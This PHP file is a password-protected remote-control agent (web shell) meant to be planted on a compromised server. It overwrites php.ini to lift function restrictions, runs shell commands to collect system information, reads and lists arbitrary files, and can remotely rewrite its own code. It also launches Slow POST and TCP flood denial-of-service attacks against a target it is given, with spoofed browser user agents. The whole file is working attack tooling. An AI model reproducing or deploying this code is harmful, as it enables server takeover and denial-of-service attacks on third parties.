<?php
@ini_set("default_socket_timeout", 1);
@ini_set('max_execution_time', 0);
$password = "";
$txt_data = "./run.txt";
if(isset($_POST['pass']) == false || empty($_POST['pass'])){ die(); }
if($_POST['pass'] != $password){ die(); }
file_put_contents("php.ini", "disable_functions = none\nsafe_mode = Off");
if(isset($_POST['check']) && $_POST['check'] == "true"){ echo "OK";}
if(isset($_POST['get_server_info']) && $_POST['get_server_info'] == "true"){
	echo json_encode(get_server_info());
}
if(isset($_POST['attack']) && !empty($_POST['attack']) && $_POST['attack'] == "true"){
	if(isset($_POST['method']) && !empty($_POST['method']) && isset($_POST['target']) && !empty($_POST['target'])){
		if($_POST['method'] == "slowpost"){
			file_put_contents($txt_data, "RUN");
			slowpost($_POST['target']);
			die();
		}elseif($_POST['method'] == "tcp_flood"){
			file_put_contents($txt_data, "RUN");
			TCP_Flood($_POST['target']);
			die();
		}
	}
}
if(isset($_POST['stop']) && !empty($_POST['stop']) && $_POST['stop'] == "true"){
	if(file_exists($txt_data)){
		file_put_contents($txt_data, "STOP");
		die();
	}
}
if(isset($_POST['give_data']) && !empty($_POST['give_data']) && $_POST['give_data'] == "true"){
	echo file_get_contents(basename(__FILE__));
}
if(isset($_POST['update']) && !empty($_POST['update']) && $_POST['update'] == "true"){
	if(isset($_POST['update_data']) && !empty($_POST['update_data'])){
		if(file_put_contents(basename(__FILE__), fix_update($_POST['update_data']))){
			echo "UPDATE";
		}
	}
}
if(isset($_POST['change_pass']) && !empty($_POST['change_pass']) && $_POST['change_pass'] == "true"){
	if(isset($_POST['new_pass']) && !empty($_POST['new_pass'])){
		$old =  file_get_contents(basename(__FILE__));
		$new = str_replace('"'.$password.'"', '"'.$_POST['new_pass'].'"', $old);
		if(file_put_contents(basename(__FILE__), $new)){
			echo "CHANGE";
		}else{
			echo "ERROR";
		}
	}
}
if(isset($_POST['get_dir']) && !empty($_POST['get_dir']) && $_POST['get_dir'] == "true"){
	echo getcwd()."/";
}
if(isset($_POST['fileman']) && !empty($_POST['fileman']) && $_POST['fileman'] == "true"){
	if(isset($_POST['loc'])){
		if(is_dir($_POST['loc']) || empty($_POST['loc'])){
			$data = array('type' => array(), 'path' => array(), 'data' => array());
			if(empty($_POST['loc'])){
				$_POST['loc'] = getcwd()."/";
			}
			if(substr($_POST['loc'], -1) != "/"){
				$_POST['loc'] .= "/";
			}
			$data['type'] = 'FOLDER';
			$data['path'] = $_POST['loc'];
			$data['data'] = get_list_files($data['path']);
			echo json_encode($data);
		}else{
			$data = array('type' => 'FILE', 'path' => $_POST['loc']);
			if(filesize($_POST['loc']) > 10485760){
				$data['data'] = "TOO BIG";
			}else{
				$content = file_get_contents($_POST['loc']);
				$data['data'] = base64_encode(gzcompress($content, 9));
				$data['info'] = array();
				$data['info']['filesize'] = filesize($_POST['loc']);
				$data['info']['md5'] = md5_file($_POST['loc']);
				$data['info']['permission'] = fileperms($_POST['loc']);
				$data['info']['last_modified'] = date ("F d Y H:i:s", GetCorrectMTime($_POST['loc']));
			}
			echo json_encode($data);
		}
	}
}

/** Get list folder and file in array including permission, filesize... **/

function get_list_files($dir){
	$list = array('folder' => array(), 'files' => array());
	$array_files = scandir($dir);
	foreach($array_files as $files){
		if($files == ".") continue;
		if(is_dir($dir.$files)){
			$list['folder'][] = $files;
		}else{
			$list['files'][] = $files;
		}
	}
	$folder_flip = array_flip($list['folder']);
	for($i = 0;$i < count($folder_flip);$i++){
		$folder = $list['folder'][$i];
		$folder_flip[$folder] = array();
		$folder_flip[$folder]['permission'] = fileperms($dir.$folder);
		$folder_flip[$folder]['last_modified'] = date ("F d Y H:i:s", GetCorrectMTime($dir.$folder));
	}
	$list['folder'] = $folder_flip;
	$files_flip = array_flip($list['files']);
	for($i = 0;$i < count($files_flip);$i++){
		$file = $list['files'][$i];
		$files_flip[$file] = array();
		$files_flip[$file]['filesize'] = filesize($dir.$file);
		$files_flip[$file]['permission'] = fileperms($dir.$file);
		$files_flip[$file]['last_modified'] = date ("F d Y H:i:s", GetCorrectMTime($dir.$file));
	}
	$list['files'] = $files_flip;
	return $list;
}

function GetCorrectMTime($filePath) { 
    $time = filemtime($filePath); 
    $isDST = (date('I', $time) == 1); 
    $systemDST = (date('I') == 1); 
    $adjustment = 0; 
    if($isDST == false && $systemDST == true) 
        $adjustment = 3600; 
    else if($isDST == true && $systemDST == false) 
        $adjustment = -3600; 
    else 
        $adjustment = 0; 
    return ($time + $adjustment); 
}

/** Info Gathering Function **/

function get_server_info(){
	$data_info = array(
		"OS_INFO" => array(
			"OS_NAME" => php_uname('s'),
			"OS_HOSTNAME" => php_uname('n'),
			"OS_RELEASE" => php_uname('r'),
			"OS_VERSION" => php_uname('v'),
			"OS_MACHINE" => php_uname('m')
		),
		"DISK_SPACE" => array(
			"DISK_TOTAL" => disk_total_space("."),
			"DISK_FREE" => disk_free_space(".")
		)
	);
	if(function_exists('shell_exec')){
		if(preg_match('/Windows/', php_uname('s'))){
			$data_info[] = "SYSTEM_INFO";
			$data_info['SYSTEM_INFO'] = shell_exec('systeminfo');
		}elseif(preg_match('/Linux/', php_uname('s'))){
			$data_info[] = "CPU_INFO";
			$data_info[] = "MEMORY_INFO";
			$data_info['CPU_INFO'] = shell_exec('lscpu');
			$data_info['MEMORY_INFO'] = shell_exec('cat /proc/meminfo');
		}
	}
	return $data_info;
}

/** All Dos Function Goes Down Here :D **/

/**
 *	http://url:port/path
 */
function slowpost($url){
	global $txt_data;
	$url = getParamsFromUrl($url);
	while (true) {
		if(file_get_contents($txt_data) == "RUN"){
			$fp = array();
			$count = 0;
			for ($i = 0; $i < 5000; $i++) {
				if(($count % 20) == 0){
					if(file_get_contents($txt_data) != "RUN"){
						break;
					}
				}
				if ($fp[$i]['sock'] = openCustomSocket($url['host'], $url['port'])) {
					if ($_length = slowPostStart($fp[$i]['sock'], $url['host'], $url['port'], $url['path'])) {
						if (!isset($fp[$i]['length'])) {
							$fp[$i]['length'] = $_length;
						}
					} else {
						@fclose($fp[$i]['sock']);
						unset($fp[$i]);
					}
				} else {
					@fclose($fp[$i]['sock']);
					unset($fp[$i]);
				}
				foreach ($fp as $_k => $_v) {
					if ($fp[$_k]['length'] > 0) {
						$_length = ($fp[$_k]['length'] < 5) ? $fp[$_k]['length'] : 5;
						slowPostContinue($fp[$_k]['sock'], $_length);
						$fp[$_k]['length'] = $fp[$_k]['length'] - $_length;
					} else {
						@fclose($fp[$_k]['sock']);
						unset($fp[$_k]);
					}
				}
				unset($_k, $_v);
				$count++;
			}
			foreach ($fp as $_k => $_v) {
				@fclose($fp[$_k]['sock']);
			}
		}else{
			break;
		}
	}
}

function TCP_Flood($host , $port){
	global $txt_data;
	ignore_user_abort(TRUE);
	set_time_limit(0);
	$packet = "";
	$packets = 0;
	while( strlen ( $packet ) < 65000 ){
		$packet .= Chr( 255 );
	}
	@$fp = fsockopen( 'tcp://'.$host, $port, $errno, $errstr, 5 );
	while(true){
		if(file_get_contents($txt_data) != "RUN"){
			break;
		}
		if( $fp ){
			fwrite($fp , $packet);
			fclose($fp);
			$packets++;
		}else{
			@$fp = fsockopen( 'tcp://'.$host, $port, $errno, $errstr, 5 );
		}
	}
}

/** All below here is external function **/
	
function getParamsFromUrl($url) {
    $url       = explode('/', $url, 4);
    $url[2]    = explode(':', $url[2], 2);
    $url[2][1] = isset($url[2][1]) ? $url[2][1] : 80;
    $host = $url[2][0];
    $port = $url[2][1];
    $path = isset($url[3]) ? $url[3] : "";
    unset($url);
    $url = array(
        'host' => $host,
        'port' => $port,
        'path' => $path
    );
    return $url;
}

function openCustomSocket($host, $port) {
    $fp = @fsockopen($host, $port, $errno, $errstr, 1);
    if (!$fp)
        return false;
    stream_set_blocking($fp, 0);
    return $fp;
}

function slowPostStart($sock, $host, $port, $path) {
    if ($sock) {
        $host   = ($port == 80) ? $host : $host . ":" . $port;
        $length = mt_rand(1337, 31337);
        $out    = "POST /".$path." HTTP/1.1\r\n";
        $out .= "Host: ".$host."\r\n";
        $out .= "User-Agent: " . random_user_agent() . "\r\n";
        $out .= "Accept: */*\r\n";
        $out .= "Accept-Encoding: gzip,deflate\r\n";
        $out .= "Keep-Alive: " . mt_rand(60, 120) . "\r\n";
        $out .= "Connection: Keep-Alive\r\n";
        $out .= "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n";
        $out .= mt_rand(0, 1) ? "Referer: http://".$host."/\r\n" : "";
        $out .= "Content-Length: ".$length."\r\n";
        $out .= "\r\n";
        @fwrite($sock, $out);
        return $length;
    } else {
        return false;
    }
}

function slowPostContinue($sock, $bytes = 5) {
    if (intval($bytes) != $bytes)
        $bytes = 5;
    if ($sock) {
        $out = "";
        for ($j = 0; $j < $bytes; $j++); {
            $out .= chr(mt_rand(33, 126));
        }
        $out = urlencode($out);
        @fwrite($sock, $out);
        return true;
    } else
        return false;
}

function random_user_agent(){
	$choice = rand(1,2);
	if($choice == 1){
		$os = array(
			"Macintosh; Intel Mac OS X 10_8_3",
			"Windows NT 5.1",
			"Windows NT 6.1; WOW64",
			"X11; CrOS armv7l 2913.260.0",
			"X11; Linux x86_64",
			"X11; FreeBSD amd64",
			"Windows NT 6.2; WOW64",
			"Windows NT 6.1",
			"Macintosh; Intel Mac OS X 10_7_3",
			"Macintosh; Intel Mac OS X 10_6_8",
			"Macintosh; Intel Mac OS X 10_7_2",
			"Windows NT 6.0",
			"Windows; U; Windows NT 5.1; en-US",
			"Windows; U; Windows NT 6.1; en-US",
			"Macintosh; U; Intel Mac OS X 10_6_6; en-US",
			"X11; U; Linux i686; en-US",
			"Windows; U; Windows NT 6.1; en-US; Valve Steam GameOverlay; ",
		);
		$os_put = $os[rand(0, (count($os)-1))];
		$applewebkit_version = rand(525,537).".".rand(0, 31);
		$chrome_version = rand(1, 31).".0.".rand(100, 1500).".".rand(20, 50);
		return "Mozilla/5.0 (".$os_put.") AppleWebKit/".$applewebkit_version." (KHTML, like Gecko) Chrome/".$chrome_version." Safari/".$applewebkit_version;
	}else{
		$os = array(
			"Macintosh; Intel Mac OS X 10.8; rv:24.0",
			"Windows NT 6.1; WOW64; rv:23.0",
			"Windows NT 6.1; rv:22.0",
			"X11; Ubuntu; Linux x86_64; rv:21.0",
			"Windows NT 5.0; rv:21.0",
			"X11; Ubuntu; Linux i686; rv:15.0",
			"Windows; U; Windows NT 5.1; en-US; rv:1.9.1.16",
			"compatible; Windows; U; Windows NT 6.2; WOW64; en-US; rv:12.0",
			"Macintosh; I; Intel Mac OS X 11_7_9; de-LI; rv:1.9b4",
			"X11; Mageia; Linux x86_64; rv:10.0.9",
			"X11; FreeBSD amd64; rv:5.0",
			"X11; U; OpenBSD i386; en-US; rv:1.9.2.8",
			"Macintosh; U; PPC Mac OS X 10.4; en-GB; rv:1.9.2.19",
			"X11; U; Linux x86_64; ja-JP; rv:1.9.2.16",
			"X11; U; Linux armv7l; en-US; rv:1.9.2.14",
			"X11; U; Linux MIPS32 1074Kf CPS QuadCore; en-US; rv:1.9.2.13",
			"X11; U; NetBSD i386; en-US; rv:1.9.2.12",
			"X11; U; SunOS i86pc; fr; rv:1.9.0.4",
			"ZX-81; U; CP/M86; en-US; rv:1.8.0.1"
		);
		$front_num = rand(5,6);
		$date = rand(2004, 2013).fix_num_date(rand(1,12)).fix_num_date(rand(1,30));
		return "Mozilla/".$front_num.".0 (".$os[rand(0, (count($os)-1))].") Gecko/".$date." Firefox/".rand(1,24).".0";
	}
}

function fix_num_date($int){
	$store = "";
	($int < 10 ? $store = "0".$int : $store = $int);
	return $store;
}

function fix_update($data){
	$data = str_replace('\\"', '"', $data);
	$data = str_replace("\\'", "'", $data);
	return str_replace("\\\\", "\\", $data);
}


?>